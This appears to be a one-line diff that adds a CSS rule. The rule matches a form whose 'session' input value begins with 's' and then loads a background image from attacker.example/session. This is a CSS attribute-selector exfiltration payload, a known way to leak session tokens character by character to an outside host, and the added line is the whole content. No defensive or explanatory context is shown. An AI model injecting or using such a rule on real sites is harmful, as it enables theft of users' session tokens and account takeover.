@@ -1,0 +1,1 @@
+form:has(input[name="session"][value^="s"]) { background-image: url("https://attacker.example/session"); }
